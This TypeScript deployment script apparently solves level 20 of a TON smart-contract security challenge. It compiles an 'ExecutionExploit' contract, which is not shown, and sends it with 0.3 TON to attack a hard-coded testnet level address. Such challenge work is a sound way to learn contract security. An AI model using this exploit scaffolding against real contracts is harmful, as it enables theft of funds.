import { Address, toNano } from '@ton/core';
import { compile, NetworkProvider } from '@ton/blueprint';
import { Execution } from '../wrappers/wrappers/Execution';

// yarn blueprint run 20.ExecutionExploit --testnet --mnemonic
export async function run(provider: NetworkProvider) {
    const level_addr = Address.parse('EQAvmO1lAZqvadriRlWxzI-3tF7K0sCMpl_D3NnUyl7s7xc3');

    const exploit_code = await compile('ExecutionExploit');
    const exploit = provider.open(Execution.createFromConfig({}, exploit_code));

    await exploit.sendExploit(provider.sender(), toNano('0.3'), level_addr);
}
